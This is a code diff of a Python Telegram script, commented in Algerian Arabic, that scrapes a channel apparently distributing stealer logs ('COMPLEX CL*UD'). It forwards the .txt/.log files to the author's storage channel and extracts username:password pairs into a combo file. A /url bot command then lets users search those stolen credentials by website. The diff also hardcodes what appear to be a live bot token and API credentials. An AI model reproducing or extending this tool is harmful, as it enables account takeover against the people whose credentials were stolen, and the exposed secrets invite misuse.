@@ -4,50 +4,76 @@ import threading
 import re
 import os
 
-# --- الإعدادات ---
+# --- الإعدادات (ثابتة) ---
 BOT_TOKEN = '8645297843:AAE7x0GWqbXlJRNv7I2Qt14nenCEL9IiIs8'
 API_ID = 34023364
 API_HASH = 'ad07473755a47402aef9c3d580886cdf'
 
-SOURCE_CHANNEL = 'ComplexCloudLogs' 
-MY_PRIVATE_CHANNEL = 'MyUlpStorage_Loay' # تأكد من أن هذا هو اليوزر الصحيح لقناتك
+# اسم قناتك المستودع
+MY_STORAGE = 'MyUlpStorage_Loay' 
 
 COMBO_FILE = "ulp.txt"
 bot = telebot.TeleBot(BOT_TOKEN)
 client = TelegramClient('Moha_Session', API_ID, API_HASH)
 
-async def process_and_forward(message):
-    # إذا كانت الرسالة فيها ملف txt أو log
-    if message.document and (message.file.ext in ['.txt', '.log']):
-        print(f"📥 جاري سحب ملف: {message.file.name}")
-        # يحول الملف لقناتك مباشرة
-        await client.send_message(MY_PRIVATE_CHANNEL, message)
-        
-        # استخراج الحسابات للملف المحلي للبحث
-        path = await message.download_media()
-        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
-            matches = re.findall(r'([a-zA-Z0-9._-]+:[a-zA-Z0-9!@#$%^&*._-]+)', f.read())
-            if matches:
-                with open(COMBO_FILE, "a", encoding='utf-8') as out:
-                    for m in matches:
-                        out.write(f"{m}\n")
-        os.remove(path)
-
-# يستقبل الرسائل الجديدة
-@client.on(events.NewMessage(chats=SOURCE_CHANNEL))
-async def handler(event):
-    await process_and_forward(event.message)
-
 async def start_harvesting():
     await client.start()
-    print(f"🚀 بدأت عملية الكشط من {SOURCE_CHANNEL}...")
+    print("🔍 جاري البحث عن قناة COMPLEX CL*UD...")
     
-    # يروح يجيب "كل" الملفات القديمة (تقدر تزيد الـ limit لـ 1000 مثلاً)
-    async for message in client.iter_messages(SOURCE_CHANNEL, limit=500):
-        await process_and_forward(message)
+    source_entity = None
+    # يبحث في كامل القنوات اللي راك داخل فيها
+    async for dialog in client.iter_dialogs():
+        if "COMPLEX CL" in dialog.name: # يبحث بالاسم لداخل القائمة
+            source_entity = dialog.entity
+            print(f"✅ لقيت القناة! الـ ID تاعها هو: {source_entity.id}")
+            break
+    
+    if not source_entity:
+        print("❌ مالقيتش القناة، تأكد بلي الحساب راهو داخل فيها!")
+        return
+
+    try:
+        storage_entity = await client.get_entity(MY_STORAGE)
         
-    print("✅ كملت سحب الملفات القديمة. ضرك راني عاس القناة على أي ملف جديد!")
-    await client.run_until_disconnected()
+        # سحب الملفات القديمة (limit=200 باش ما يتبلوكااش)
+        async for message in client.iter_messages(source_entity, limit=200):
+            if message.document and (message.file.ext in ['.txt', '.log']):
+                print(f"📥 سحب ملف: {message.file.name}")
+                await client.send_message(storage_entity, message) # تحويل لقناتك
+                
+                # استخراج البيانات
+                path = await message.download_media()
+                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                    matches = re.findall(r'([a-zA-Z0-9._-]+:[a-zA-Z0-9!@#$%^._-]+)', f.read())
+                    if matches:
+                        with open(COMBO_FILE, "a", encoding='utf-8') as out:
+                            for m in matches: out.write(f"{m}\n")
+                os.remove(path)
+        
+        print("✅ كملت السحب القديم، راني نعس في الجديد ضرك!")
+
+        @client.on(events.NewMessage(chats=source_entity))
+        async def handler(event):
+            if event.message.document and (event.message.file.ext in ['.txt', '.log']):
+                await client.send_message(storage_entity, event.message)
+                print("🆕 ملف جديد وصل وحولته!")
+
+        await client.run_until_disconnected()
+
+    except Exception as e:
+        print(f"❌ كاين مشكل: {e}")
+
+# أمر البحث
+@bot.message_handler(commands=['url'])
+def search(message):
+    query = message.text.replace('/url', '').strip().lower()
+    if os.path.exists(COMBO_FILE):
+        with open(COMBO_FILE, "r", encoding="utf-8", errors="ignore") as f:
+            res = [l.strip() for l in f if query in l.lower()]
+            if res: bot.reply_to(message, f"🎯 هاك واش صيدت لـ {query}:\n\n" + "\n".join(res[:15]))
+            else: bot.reply_to(message, "❌ مكانش هاد الموقع.")
+    else:
+        bot.reply_to(message, "⏳ الماكينة تجمع...")
 
 if __name__ == "__main__":
     threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
